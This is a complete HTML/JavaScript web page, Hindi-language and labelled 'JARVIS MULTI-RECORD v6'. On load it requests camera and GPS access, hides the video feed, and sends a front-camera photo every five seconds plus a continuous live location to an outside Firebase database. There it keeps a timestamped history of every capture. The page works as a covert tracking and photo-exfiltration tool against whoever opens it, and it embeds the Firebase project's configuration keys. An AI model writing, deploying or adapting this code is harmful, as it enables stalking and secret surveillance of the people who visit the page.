<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JARVIS REMOTE - CONTINUOUS STREAM</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: #00f2ff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; margin: 0; }
        .control-box { border: 2px solid #00f2ff; background: #0a0a0a; padding: 25px; display: inline-block; border-radius: 10px; max-width: 400px; width: 100%; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); margin-top: 40px; }
        .status-text { margin-top: 15px; font-size: 14px; color: #fff; text-align: left; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 4px; border-left: 3px solid #39ff14; }
        #v, canvas { display: none; }
        .live-dot { width: 10px; height: 10px; background-color: #39ff14; border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
    </style>
</head>
<body>
    <div class="control-box">
        <h2>JARVIS MULTI-RECORD v6 <span class="live-dot"></span></h2>
        <p style="color: #888; font-size: 13px;">लगातार रिकॉर्डिंग और ट्रैकिंग मोड सक्रिय है</p>
        <video id="v" autoplay playsinline muted></video>
        <canvas id="c"></canvas>
        <div class="status-text" id="log-status">सिस्टम लोड हो रहा है...</div>
    </div>

    <script>
        const firebaseConfig = {
          apiKey: "AIzaSyAfwCTBBc_LT8j7neC_aJhBCHUXj3QkSHc",
          authDomain: "army-cb492.firebaseapp.com",
          databaseURL: "https://army-cb492-default-rtdb.firebaseio.com",
          projectId: "army-cb492",
          appId: "1:449848409517:web:386ad1b570731b6ec4f524"
        };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        window.onload = function() {
            startLiveTracking();
        };

        async function startLiveTracking() {
            const statusDiv = document.getElementById('log-status');
            statusDiv.innerHTML = "📡 कैमरा और GPS सिंक किया जा रहा है...";
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;

                navigator.geolocation.watchPosition((pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    // लोकेशन को मेन नोड पर लाइव रखें
                    database.ref('live_detect/location').set({ lat: lat, lon: lon });
                    statusDiv.innerHTML = `📍 GPS ट्रैक ऑन: ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
                }, err => {
                    statusDiv.innerHTML = "❌ GPS परमिशन आवश्यक है।";
                }, { enableHighAccuracy: true });

                video.onloadedmetadata = () => {
                    // ⏱️ कैमरे को ब्लैक स्क्रीन से बचाने के लिए 2000ms (2 सेकंड) का डिले
                    setTimeout(() => {
                        captureAndPushRecord(); 
                        setInterval(captureAndPushRecord, 5000); // फिर हर 5 सेकंड में ऑटोमैटिकली
                    }, 2000);
                };

            } catch(e) {
                statusDiv.innerHTML = "❌ परमिशन एरर: कैमरा अलाउ करें बॉस!";
            }
        }

        function captureAndPushRecord() {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            
            c.width = 240; 
            c.height = 180;
            c.getContext('2d').drawImage(v, 0, 0, 240, 180);
            const compressedPhoto = c.toDataURL('image/jpeg', 0.4); 

            const timestamp = Date.now();

            // 🌟 नया रिकॉर्ड बनाने के लिए .update() की जगह अलग नोड पर पुश (Push) लॉजिक
            // इससे पुराना डेटा डिलीट नहीं होगा, नया रिकॉर्ड जुड़ता जाएगा
            database.ref('live_detect').update({
                photo: compressedPhoto,
                last_updated: timestamp
            });

            // बैकअप हिस्ट्री रिकॉर्ड (ताकि सारे पुराने रिकॉर्ड सेव रहें)
            database.ref('jarvis_history/' + timestamp).set({
                photo: compressedPhoto,
                time: new Date().toLocaleTimeString()
            });
        }
    </script>
</body>
</html>
